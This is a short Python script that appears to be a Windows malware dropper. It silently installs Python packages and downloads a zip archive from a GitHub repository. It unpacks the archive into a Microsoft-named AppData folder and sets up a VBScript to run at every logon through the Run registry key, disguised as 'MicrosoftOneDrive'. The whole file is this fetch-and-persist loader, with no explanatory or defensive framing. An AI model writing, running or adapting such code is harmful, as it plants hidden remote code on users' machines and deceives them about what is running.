import os
os.system("pip install -q requests winshell")
import getpass
from zipfile import ZipFile
import requests
import winreg
import winshell
user = getpass.getuser()

def main():

    r = requests.get("https://github.com/spxctrzz/adawdgsdfagdf/raw/refs/heads/main/runtime.zip")
    with open(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "wb") as f:
        f.write(r.content)
    with ZipFile(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "r") as f:
        f.extractall(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime")
    os.remove(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip")
    with winshell.shortcut(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\runcut.lnk") as shortcut:
        shortcut.path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\run.vbs"
    runkey = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(runkey, "MicrosoftOneDrive", 0, winreg.REG_SZ, fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\runcut.lnk")
    runkey.Close()


main()